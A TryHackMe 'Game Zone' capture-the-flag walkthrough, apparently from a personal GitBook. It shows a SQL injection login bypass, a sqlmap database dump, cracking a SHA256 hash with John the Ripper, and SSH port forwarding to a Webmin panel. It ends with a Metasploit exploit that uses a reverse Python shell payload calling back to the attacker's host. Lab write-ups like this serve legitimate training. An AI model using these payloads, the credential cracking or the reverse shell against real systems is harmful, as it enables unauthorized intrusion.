# Game Zone

**Room Link:** [https://tryhackme.com/room/gamezone](https://tryhackme.com/room/gamezone)



### **Obtain access via SQLi**

Username field was vulnerable to SQLi,

```
Username: ' or 1=1 -- -
Password: anything
```

<figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

### **Using SQLMap**

I setup burp to intercept requests and then tried searching for something on the portal page

<figure><img src="../../.gitbook/assets/image (10) (2).png" alt=""><figcaption></figcaption></figure>

Saved the request into a file called request.txt, if you highlight everything and right click you can copy to file

<figure><img src="../../.gitbook/assets/image (4) (3).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (29) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (6) (3).png" alt=""><figcaption></figcaption></figure>

```
sqlmap -r request.txt --dbms=mysql --dump
```

<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

**In the users table, what is the hashed password?**

ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14

**What was the username associated with the hashed password?**

agent47

**What was the other table name?**

post

<figure><img src="../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

****

### **Cracking a password with JohnTheRipper**

Used the following site to idenfitfy what the hash type was. It identified that it is SHA2-256.

**Hash Analyzer:** [https://www.tunnelsup.com/hash-analyzer/](https://www.tunnelsup.com/hash-analyzer/)

<figure><img src="../../.gitbook/assets/image (27) (1).png" alt=""><figcaption></figcaption></figure>

**What is the de-hashed password?**

john was able to crack the hash ehich gave us the password videogamer124.

```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=RAW-SHA256
```

<figure><img src="../../.gitbook/assets/image (14) (2).png" alt=""><figcaption></figcaption></figure>

```
ssh agent47@10.10.74.145
Password: videogamer124
```

\
**Now you have a password and username. Try SSH'ing onto the machine. What is the user flag?**

<figure><img src="../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

**Exposing services with reverse SSH tunnels**

**How many TCP sockets are running?**

```
ss -tulpn
```

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

**What is the name of the exposed CMS?**

```
ssh -L 10000:localhost:10000 agent47@10.10.74.145
Password: videogamer124
```

<figure><img src="../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

**What is the CMS version?**

I was able to login with the previous credentials found and find the CMS version.

```
Username: agent47
Password: videogamer124
```

<figure><img src="../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

### **Privilege Escalation with Metasploit**

****

<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

```
msfconsole
search 1.580
use 1
set USERNAME agent47
set PASSWORD videogamer124
set RHOSTS 127.0.0.1
set ssl false 

set payload cmd/unix/reverse_python
set lhost 10.10.108.150
set lport 443
exploit
```

<figure><img src="../../.gitbook/assets/image (3) (1) (2).png" alt=""><figcaption></figcaption></figure>
